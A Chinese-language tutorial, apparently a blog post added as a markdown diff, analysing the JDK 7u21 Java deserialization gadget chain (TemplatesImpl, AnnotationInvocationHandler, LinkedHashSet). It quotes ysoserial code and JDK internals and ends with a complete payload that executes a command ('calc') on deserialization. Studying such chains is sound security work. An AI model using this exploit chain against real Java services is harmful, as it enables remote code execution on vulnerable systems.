@@ -1,0 +1,571 @@
+## 简介
+
+jdk7u21 链，是一个不需要借助第三方库就能实现的链。影响版本<=7u21
+
+## 分析
+
+### from ysonerial
+
+我们先来看看ysonerial里的payload是怎么写的，然后沿着其思路进行分析
+
+    
+    
+    public Object getObject(String command) throws Exception {  
+    Object templates = Gadgets.createTemplatesImpl(command);  
+    String zeroHashCodeStr = "f5a5a608";  
+    HashMap map = new HashMap();  
+    map.put(zeroHashCodeStr, "foo");  
+    InvocationHandler tempHandler = (InvocationHandler)Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, map);  
+    Reflections.setFieldValue(tempHandler, "type", Templates.class);  
+    Templates proxy = (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]);  
+    LinkedHashSet set = new LinkedHashSet();  
+    set.add(templates);  
+    set.add(proxy);  
+    Reflections.setFieldValue(templates, "_auxClasses", (Object)null);  
+    Reflections.setFieldValue(templates, "_class", (Object)null);  
+    map.put(zeroHashCodeStr, templates);  
+    return set;  
+    }
+
+### TemplatesImpl
+
+我们看到，ysonerial的payload上来就通过Gadgets.createTemplatesImpl(command)
+试图创建一个TemplatesImpl类。
+createTemplatesImpl源码如下，我们发现创建TemplatesImpl类后又通过反射和javassist做了许多操作。
+
+    
+    
+    public static <T> T createTemplatesImpl(String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {  
+    T templates = tplClass.newInstance();  
+    ClassPool pool = ClassPool.getDefault();  
+    pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));  
+    pool.insertClassPath(new ClassClassPath(abstTranslet));  
+    CtClass clazz = pool.get(Gadgets.StubTransletPayload.class.getName());  
+    String cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") + "\");";  
+    clazz.makeClassInitializer().insertAfter(cmd);  
+    clazz.setName("ysoserial.Pwner" + System.nanoTime());  
+    CtClass superC = pool.get(abstTranslet.getName());  
+    clazz.setSuperclass(superC);  
+    byte[] classBytes = clazz.toBytecode();  
+    Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)});  
+    Reflections.setFieldValue(templates, "_name", "Pwnr");  
+    Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());  
+    return templates;  
+    }
+
+那么为什么要创建这个类并且调用反射和javassist机制呢？先不急，我们看一下TemplatesImpl源码。
+
+首先TemplatesImpl类中有个方法defineTransletClasses，它的主要代码如下
+
+    
+    
+    private byte[][] _bytecodes = (byte[][])null;  
+    ​  
+    private void defineTransletClasses() throws TransformerConfigurationException {  
+    if (this._bytecodes == null) {  
+    .....  
+    } else {  
+    TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() {  
+    public Object run() {  
+    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader());  
+    }  
+    });  
+    ​  
+    try {  
+    int classCount = this._bytecodes.length;  
+    this._class = new Class[classCount];  
+    ​  
+    for(int i = 0; i < classCount; ++i) {  
+    this._class[i] = loader.defineClass(this._bytecodes[i]);  \\将_bytecodes中的所有字节通过defineClass转化为一个类  
+    Class superClass = this._class[i].getSuperclass();  
+    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  
+    this._transletIndex = i;  
+    } else {  
+    this._auxClasses.put(this._class[i].getName(), this._class[i]);  
+    }  
+    }  
+    }
+
+也就是说通过这个方法可以将_bytecodes数组中的字节还原成一个类，存储到_class变量中。接下来如果我们能找到调用defineTransletClasses方法并执行了_class[].newinstance()
+这样的的代码的方法，就能实例化从字节得到的类了，从而就能执行类中的静态代码块和构造函数了！ 所以接下来我们需要去寻找这种方法。
+通过搜索defineTransletClasses，我们找到了有如下三个方法调用了defineTransletClasses方法：
+
+    
+    
+    getTransletInstance  
+    getTransletIndex  
+    getTransletClasses
+
+其中，getTransletInstance方法是唯一符合“调用了defineTransletClasses且有_class[].newinstance()”的方法，其代码如下
+
+    
+    
+    private Translet getTransletInstance() throws TransformerConfigurationException {  
+    ErrorMsg err;  
+    try {  
+    if (this._name == null) {  
+    return null;  
+    } else {  
+    if (this._class == null) {  
+    this.defineTransletClasses();  
+    }  
+    ​  
+    AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\here  
+    translet.postInitialization();  
+    translet.setTemplates(this);  
+    translet.setServicesMechnism(this._useServicesMechanism);  
+    if (this._auxClasses != null) {  
+    translet.setAuxiliaryClasses(this._auxClasses);  
+    }  
+    ​  
+    return translet;  
+    }
+
+那么，getTransletInstance是一个private方法，我们不能直接调用它，在那里能去调用它呢？答案是newTransformer方法
+
+    
+    
+    public synchronized Transformer newTransformer() throws TransformerConfigurationException {  
+    TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory);  \\here  
+    ········  
+    }
+
+OK.我们找到了触发7u21链的一个核心点了。我们写个小demo来通过TemplatesImpl实现代码执行
+小demo的实现思路为：通过javassist动态生成一个恶意类（构造方法或者静态代码块有恶意代码），然后通过反射生成一个TemplatesImpl对象并设置各个变量的值，然后调用一下TemplatesImpl对象的newTransformer方法即可造成代码执行，代码如下
+
+    
+    
+    public class test{  
+    public static void main(String[] args) throws Exception {  
+    ClassPool pool = ClassPool.getDefault();  
+    CtClass cc = pool.makeClass("evilclass");  
+    String cmd = "Runtime.getRuntime().exec(\"calc\");";  
+    cc.makeClassInitializer().insertBefore(cmd); \\向静态代码块插入恶意代码，插入到构造函数也可以  
+    cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  \\需设置此项才能实现newinstance，具体原因请看defineTransletClasses和getTransletInstance源码  
+    cc.setName("evilClass");  
+    ​  
+    ​  
+    byte[] evilbytes = cc.toBytecode();  
+    byte[][] targetByteCodes = new byte[][]{evilbytes};  
+    TemplatesImpl templates = TemplatesImpl.class.newInstance();  
+    Class clazz = TemplatesImpl.class.newInstance().getClass();  
+    Field[] Fields = clazz.getDeclaredFields();  
+    for (Field Field : Fields) { //遍历Fields数组  
+    try {   
+    Field.setAccessible(true);  //对数组中的每一项实现私有访问  
+    if(Field.getName()=="_bytecodes"){  
+    Field.set(templates,targetByteCodes);  
+    }  
+    if(Field.getName()=="_class"){  
+    Field.set(templates,null);  
+    }  
+    if(Field.getName()=="_name"){  
+    Field.set(templates,"abc");  
+    }  
+    if(Field.getName()=="_tfactory"){  
+    Field.set(templates,new TemplatesImpl());  
+    }  
+    } catch (Exception e) {}  
+    }  
+    templates.newTransformer();  
+    }  
+    }
+
+但仅仅是这样，肯定是不够的。
+
+### AnnotationInvocationHandler
+
+我们继续看ysoserial源码可以看到动用了AnnotationInvocationHandler这个东西.这个类原本的作用是作为Annotation
+类的动态代理
+
+我们把目光聚焦于invoke方法——动态代理的核心
+
+    
+    
+    public Object invoke(Object var1, Method var2, Object[] var3) {  
+    String var4 = var2.getName();  
+    Class[] var5 = var2.getParameterTypes();  
+    if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {  
+    return this.equalsImpl(var3[0]);  
+    }   
+    ..........  
+    }
+
+它会检测传入的方法中是否有符合 名为equals，只有一个Object类型参数。若是，则调用equalsImpl方法并传入方法中的参数。
+跟进equalsimpl方法
+
+    
+    
+    private Boolean equalsImpl(Object var1) {  
+    if (var1 == this) {  
+    return true;  
+    } else if (!this.type.isInstance(var1)) {  
+    return false;  
+    } else {  
+    Method[] var2 = this.getMemberMethods();  
+    int var3 = var2.length;  
+    ​  
+    for(int var4 = 0; var4 < var3; ++var4) {  
+    Method var5 = var2[var4];  
+    String var6 = var5.getName();  
+    Object var7 = this.memberValues.get(var6);  
+    Object var8 = null;  
+    AnnotationInvocationHandler var9 = this.asOneOfUs(var1);  
+    if (var9 != null) {  
+    var8 = var9.memberValues.get(var6);  
+    } else {  
+    try {  
+    var8 = var5.invoke(var1);   \\here  
+    } catch (InvocationTargetException var11) {  
+    return false;  
+    } catch (IllegalAccessException var12) {  
+    throw new AssertionError(var12);  
+    }  
+    }  
+    ​  
+    if (!memberValueEquals(var7, var8)) {  
+    return false;  
+    }  
+    }  
+    ​  
+    return true;  
+    }  
+    }
+
+发现会invoke 传入参数中的所有方法。 那么接下来我们就可以按照下面的思路写一个命令执行小demo:
+
+创建一个包含恶意代码的TemplatesImpl实例，通过AnnotationInvocationHandler创建任意一个代理对象，然后代理对象调用equals方法传入参数为恶意TemplatesImpl对象，即可造成恶意代码执行
+看到这里一定一头雾水，看看demo也许会好一点
+
+    
+    
+    public class test{  
+    public static void main(String[] args) throws Exception {  
+    ClassPool pool = ClassPool.getDefault();  
+    CtClass cc = pool.makeClass("evilclass");  
+    String cmd = "Runtime.getRuntime().exec(\"calc\");";  
+    CtConstructor cons = new CtConstructor(new CtClass[]{},cc);  
+    cons.setBody("Runtime.getRuntime().exec(\"calc\");");  
+    cc.addConstructor(cons);  
+    cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  
+    cc.setName("evilClass");  
+    ​  
+    byte[] evilbytes = cc.toBytecode();  
+    byte[][] targetByteCodes = new byte[][]{evilbytes};  
+    TemplatesImpl templates = TemplatesImpl.class.newInstance();  
+    Class clazz = TemplatesImpl.class.newInstance().getClass();  
+    Field[] Fields = clazz.getDeclaredFields();  
+    for (Field Field : Fields) { //遍历Fields数组  
+    try { //执行get()方法时需抛出IllegalAccessException错误  
+    Field.setAccessible(true);  //对数组中的每一项实现私有访问  
+    if(Field.getName()=="_bytecodes"){  
+    Field.set(templates,targetByteCodes);  
+    }  
+    if(Field.getName()=="_class"){  
+    Field.set(templates,null);  
+    }  
+    if(Field.getName()=="_name"){  
+    Field.set(templates,"abc");  
+    }  
+    if(Field.getName()=="_tfactory"){  
+    Field.set(templates,new TemplatesImpl());  
+    }  
+    } catch (Exception e) {}  
+    }  
+    //以上代码生成了恶意TemplatesImpl对象templates  
+    ​  
+    Map map = new HashMap();  
+    final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];  //获得AnnotationInvocationHandler构造方法，方便获得它一个实例  
+    ctor.setAccessible(true);  
+    InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);  //这里有个问题，为什么要传入Templates类对象而不是TemplatesImpl  
+    Object proxy = Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler);  \\反正创建一个AnnotationInvocationHandler的代理对象就行了，前两个参数都不用怎么管  
+    proxy.equals(templates); //恶意代码执行  
+    }  
+    }
+
+我们慢慢看看逻辑，在proxy.equals处下断点，调试 毫无疑问会进入到此处：AnnotationInvocationHandler的invoke方法。
+
+然后参数符合if判断，调用equalsImpl方法，并传入参数为恶意TemplatesImpl对象，接下来就是进入反射调用处
+
+遍历var2变量中的方法，并由我们的恶意对象来执行。
+
+————此处插一下var2变量的来历
+
+注意此处的getMemberMethods方法，它实质上是通过反射获得this.type中的所有方法。而this.type是在该对象构造方法中传入的第一个参数。
+
+getMemberMethods：
+
+构造方法：
+
+————回到正题
+
+由于我们通过反射传入构造方法的第一个参数是Templates.class，所以它会遍历Templates类中的所有方法。这个类其实是TemplatesImpl的接口类，它的代码如下
+
+所以var2中存储的方法只有两个，newTransformer和getOutputProperties。
+然后当遍历到newTransformer方法时，就会通过反射调用达到 eviltemplatesImpl.newTransformer()
+的效果，从而导致恶意TemplatesImpl对象中的恶意代码被执行。
+
+这里承接上面说的，为什么初始化AnnotationInvocationHandler对象时传入的第一个参数（即this.type)是Templates.class，而不是TemplatesImpl.class
+诚然，这两个类对象都有方法newTransformer。但是如果传入TemplatesImpl.class，在遍历其中方法并通过反射执行时会出现错误：equalsImpl中的反射调用是不传入参数的
+
+![image-20210330013705054](https://image.3001.net/images/20210331/1617172881_60641991a75bd4fd7fcb8.png!small)
+
+而TemplatesImpl中有许多需要传入参数才能被正常使用的方法，如果不传入参数就反射调用就会抛出异常，以至于在遍历到newTransformer方法前就会抛出异常，从而导致代码执行不被实现。
+
+仅仅是这样，也还是不够的，我们还是得手动调用equals才能导致代码执行，反序列化点在哪里？
+
+### LinkedHashSet
+
+ysoserial的payload中出现了此类。
+
+![image-20210330014015703](https://image.3001.net/images/20210331/1617172881_60641991f1de6da9fca7f.png!small)
+
+LinkedHashSet继承自HashSet类，它的readObject方法也是从HashSet继承而来的。我们看看readObject方法的构造
+
+    
+    
+    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {  
+    var1.defaultReadObject();  
+    int var2 = var1.readInt();  
+    float var3 = var1.readFloat();  
+    this.map = (HashMap)(this instanceof LinkedHashSet ? new LinkedHashMap(var2, var3) : new HashMap(var2, var3));  
+    int var4 = var1.readInt();  
+    ​  
+    for(int var5 = 0; var5 < var4; ++var5) {  
+    Object var6 = var1.readObject();  
+    this.map.put(var6, PRESENT);  
+    }  
+    ​  
+    }  
+    }
+
+它的主要亮点在for循环里面：遍历传入的序列化对象，将其反序列化后，再传入put方法
+
+所以我们再来跟进一下map.put方法
+
+    
+    
+    public V put(K var1, V var2) {  
+    if (var1 == null) {  
+    return this.putForNullKey(var2);  
+    } else {  
+    int var3 = this.hash(var1);  
+    int var4 = indexFor(var3, this.table.length);  
+    ​  
+    for(HashMap.Entry var5 = this.table[var4]; var5 != null; var5 = var5.next) {  
+    Object var6;  
+    if (var5.hash == var3 && ((var6 = var5.key) == var1 || var1.equals(var6))) {  //here  
+    Object var7 = var5.value;  
+    var5.value = var2;  
+    var5.recordAccess(this);  
+    return var7;  
+    }  
+    }  
+    ​  
+    ++this.modCount;  
+    this.addEntry(var3, var1, var2, var4);  
+    return null;  
+    }  
+    }
+
+注意我们添加注释那一行，有一个var1.equals(var6)))
+其中var1和var6我们都是可以控制的：var1即传入的反序列化对象(恶意TemplatesImpl)，var6实际上也是我们传入的反序列化对象（恶意AnnotationInvocationHandler代理对象）。
+
+但是想要执行var1.equals(var6))) 则必须要让 var5.hash == var3 为true 且 (var6 = var5.key) ==
+var1为false. 怎么做到呢？
+
+注意put方法的第5行，对传入的反序列化对象调用了hash方法。我们跟进hash方法
+
+    
+    
+    final int hash(Object var1) {  
+    int var2 = 0;  
+    if (this.useAltHashing) {  
+    if (var1 instanceof String) {  
+    return Hashing.stringHash32((String)var1);  
+    }  
+    ​  
+    var2 = this.hashSeed;  
+    }  
+    ​  
+    var2 ^= var1.hashCode();  //here  
+    var2 ^= var2 >>> 20 ^ var2 >>> 12;  
+    return var2 ^ var2 >>> 7 ^ var2 >>> 4;  
+    }
+
+发现会执行传入的参数对象的hashCode()方法
+当我们传入的参数为恶意AnnotationInvocationHandler代理对象时，会调用代理对象中的invoke方法。对于AnnotationInvocationHandler而言当判断到执行hashCode方法时，实质上会执行AnnotationInvocationHandler中的hashCodeImpl方法
+
+![image-20210330155159938](https://image.3001.net/images/20210331/1617172882_6064199282a1f1e2c13d2.png!small)
+
+我们跟进hashCodeImpl
+
+    
+    
+    private int hashCodeImpl() {  
+    int var1 = 0;  
+    ​  
+    Entry var3;  
+    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {  
+    var3 = (Entry)var2.next();  
+    }  
+    ​  
+    return var1;  
+    }  
+    上面是真实代码，比较难看，所以借鉴了一下别人对其进行修改后的代码，方便我们进行分析  
+    private int hashCodeImpl() {  
+    int result = 0;  
+    // 遍历 memberValues  
+    Iterator itr = this.memberValues.entrySet().iterator();  
+    for( ;itr.hasNext(); ) {  
+    Entry entry = (Entry)itr.next();  
+    String key = ((String)entry.getKey());  
+    Object value = entry.getValue();  
+    // 127 * key 的 hashCode，再和 memberValueHashCode(value) 进行异或  
+    result += 127 * key.hashCode() ^ memberValueHashCode(value);  
+    }  
+    return result;  
+    }
+
+这个方法会遍历this.memberValues属性（这个属性实质上就是HashMap内添加的属性），然后对其中每一项键值属性进行进行位运算并累加
+
+其中memberValueHashCode函数我们也可以跟进一下![image-20210330163952543](https://image.3001.net/images/20210331/1617172882_60641992d1a7fe16fc54e.png!small)
+
+发现只要传入参数不为数组，就调用它的hashCode函数并返回。
+
+我们来梳理一下，怎么才能调用到put方法里的equals触发代码执行： payload阶段：
+
+建立一个map变量，其key为特殊的一个值:f5a5a608,这个值的hashCode是0，然后值为恶意templatesImpl类，然后以这个map变量为参数建立AnnotationInvocationHandler代理对象。
+
+![image-20210330214752872](https://image.3001.net/images/20210331/1617172883_60641993339aba81b7c95.png!small)
+
+再向HashMap里放入一个值，键为恶意TemplatesImpl对象， 再放入一个值，键为恶意AnnotationInvocationHandler对象。
+（LinkedHashSet会让HashMap有序，从而在反序列化的时候能按顺序依次从HashMap读取对象。如果用HashSet，则会在反序列化时报错）
+
+![image-20210330215307269](https://image.3001.net/images/20210331/1617172883_6064199390359068b68d7.png!small)
+
+反序列化阶段：
+
+随后在readObject时，TemplatesImpl先被put方法调用。
+
+![image-20210331134536961](https://image.3001.net/images/20210331/1617172884_606419940aa32a290f5e1.png!small)
+
+然后在put方法里通过hash()方法获得其hash，并将其录入到它的hash属性里，然后写入到HashMap的存储队列里。
+
+![image-20210331134644800](https://image.3001.net/images/20210331/1617172884_606419945645a68af513e.png!small)然后AnnotationInvocationHandler再被put方法调用
+
+![image-20210331134717624](https://image.3001.net/images/20210331/1617172884_60641994b235dd66c5654.png!small)在对其使用hash方法获得hash时，会因其是一个代理类的缘故在hash函数内部调用hashCode()方法时会调用其代理方法hashCodeImpl。
+
+![image-20210331134852582](https://image.3001.net/images/20210331/1617172885_606419951e6802c5245d0.png!small)
+
+![image-20210331134859824](https://image.3001.net/images/20210331/1617172885_606419956247fc86adce3.png!small)
+
+随后在hashCodeImpl内部遍历this.memberValues变量（也就是之前初始化时放入的map变量）
+
+![image-20210331135006119](https://image.3001.net/images/20210331/1617172885_60641995b8b6b243cc392.png!small)
+
+将每一项的key值的hashCode与传入map vaule值作为参数的memberValueHashCode方法进行异或。
+这个memberValueHashCode方法会判断传入的值是否为数组，若不是数组则直接返回参数的hashCode()。
+
+因为我们之前初始化代理对象时传入的是一个键为f5a5a608，值为eviltemplates的map，所以以上hash计算最终得到的结果，便是0^(templatesImpl.hashCode()).
+也就是templatesImpl.hashCode()。所以也就是说AnnotationInvocationHandler对象作为参数传入被hash方法执行后的结果，就相当于是hash(eviltemplates)
+
+随后这个值来到if判断逻辑，它遍历之前的值，并将遍历得到的值赋给var5
+
+上一个值的hash（也就是eviltemplates的hash）与AnnotationInvocationHandler对象的hash（也还是eviltemplates的hash）相同，但是AnnotationInvocationHandler对象与eviltemplates对象并不相同，所以便触动了equals，代码执行成功。
+
+### 完整payload
+
+纵观以上三个类，我们可以写出payload
+
+    
+    
+    public static void main(String[] args) throws Exception {  
+    ClassPool pool = ClassPool.getDefault();  
+    CtClass cc = pool.makeClass("evilclass");  
+    String cmd = "Runtime.getRuntime().exec(\"calc\");";  
+    CtConstructor cons = new CtConstructor(new CtClass[]{},cc);  
+    cons.setBody("Runtime.getRuntime().exec(\"calc\");");  
+    cc.addConstructor(cons);  
+    cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  
+    cc.setName("evilClass");  
+    ​  
+    byte[] evilbytes = cc.toBytecode();  
+    byte[][] targetByteCodes = new byte[][]{evilbytes};  
+    TemplatesImpl templates = TemplatesImpl.class.newInstance();  
+    Class clazz = TemplatesImpl.class.newInstance().getClass();  
+    Field[] Fields = clazz.getDeclaredFields();  
+    for (Field Field : Fields) { //遍历Fields数组  
+    try { //执行get()方法时需抛出IllegalAccessException错误  
+    Field.setAccessible(true);  //对数组中的每一项实现私有访问  
+    if(Field.getName()=="_bytecodes"){  
+    Field.set(templates,targetByteCodes);  
+    }  
+    if(Field.getName()=="_class"){  
+    Field.set(templates,null);  
+    }  
+    if(Field.getName()=="_name"){  
+    Field.set(templates,"abc");  
+    }  
+    if(Field.getName()=="_tfactory"){  
+    Field.set(templates,new TemplatesImpl());  
+    }  
+    } catch (Exception e) {}  
+    }  
+    ​  
+      
+    Map map = new HashMap();  
+    String magicStr = "f5a5a608";  
+    final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];  
+    ctor.setAccessible(true);  
+    ​  
+    InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);  
+    Object proxy =  Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler);  
+    HashSet target = new LinkedHashSet();  
+    target.add(templates);  
+    target.add(proxy);  
+    //这个map需要在Hashmap put了proxy后再赋值，不然会报错（我也不知道为什么  
+    map.put(magicStr, templates);  
+    // 序列化  
+    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));  
+    oos.writeObject(target);  
+    // 反序列化  
+    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
+    ois.readObject();
+
+看一下调用栈
+
+![image-20210331140050263](https://image.3001.net/images/20210331/1617172886_606419963a3bd27b565e7.png!small)
+
+更直观的调用链
+
+    
+    
+    LinkedHashSet.readObject()  
+    LinkedHashSet.add()  
+    ...  
+    TemplatesImpl.hashCode() (X)  
+    LinkedHashSet.add()  
+    ...  
+    Proxy(Templates).hashCode() (X)  
+    AnnotationInvocationHandler.invoke() (X)  
+    AnnotationInvocationHandler.hashCodeImpl() (X)  
+    String.hashCode() (0)  
+    AnnotationInvocationHandler.memberValueHashCode() (X)  
+    TemplatesImpl.hashCode() (X)  
+    Proxy(Templates).equals()  
+    AnnotationInvocationHandler.invoke()  
+    AnnotationInvocationHandler.equalsImpl()  
+    Method.invoke()  
+    ...  
+    // TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer()  
+    TemplatesImpl.newTransformer()  
+    TemplatesImpl.getTransletInstance()  
+    TemplatesImpl.defineTransletClasses()  
+    ClassLoader.defineClass()  
+    Class.newInstance()  
+    ...  
+    MaliciousClass.<clinit>()  
+    ...  
+    Runtime.exec()
+
